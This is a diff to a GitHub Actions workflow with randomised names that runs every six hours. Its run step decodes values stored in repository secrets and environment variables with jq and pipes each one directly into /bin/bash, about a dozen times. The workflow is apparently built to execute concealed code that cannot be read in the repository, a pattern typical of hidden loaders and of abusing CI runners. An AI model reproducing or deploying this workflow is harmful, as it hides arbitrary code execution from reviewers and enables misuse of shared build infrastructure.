@@ -3,26 +3,22 @@ name: fengyuanchai4545
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 4/6 * * *'
+    - cron: '5 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: fengyuanchai4545
         env:
-          zddo02859: ${{ secrets.zddo02859 }}
+          plpd79: ${{ secrets.plpd79 }}
         run: |
-          echo $zddo02859 | jq -r .rltxy251 | /bin/bash
-          echo $u62942 | jq -r .ugd03945 | /bin/bash
-          echo $ax4412 | jq -r .j7 | /bin/bash
-          echo $new5 | jq -r .s50 | /bin/bash
-          echo $gxmlw43 | jq -r .xbp287 | /bin/bash
-          echo $ixkw35 | jq -r .nys35734 | /bin/bash
-          echo $q704 | jq -r .cbc4 | /bin/bash
-          echo $zueu3 | jq -r .xe75 | /bin/bash
-          echo $okod489 | jq -r .teb7307 | /bin/bash
-          echo $lqyto98 | jq -r .nbaq8 | /bin/bash
-          echo $ezk3 | jq -r .zb46 | /bin/bash
+          echo $plpd79 | jq -r .nl2778 | /bin/bash
+          echo $jengv07 | jq -r .yqbtn3326 | /bin/bash
+          echo $wkf9 | jq -r .sqfs419 | /bin/bash
+          echo $cop461 | jq -r .t5858 | /bin/bash
+          echo $q79 | jq -r .viel75 | /bin/bash
+          echo $eh24428 | jq -r .a8 | /bin/bash
+          echo $ass8 | jq -r .z97 | /bin/bash
+          echo $u57 | jq -r .zymsj631 | /bin/bash
 
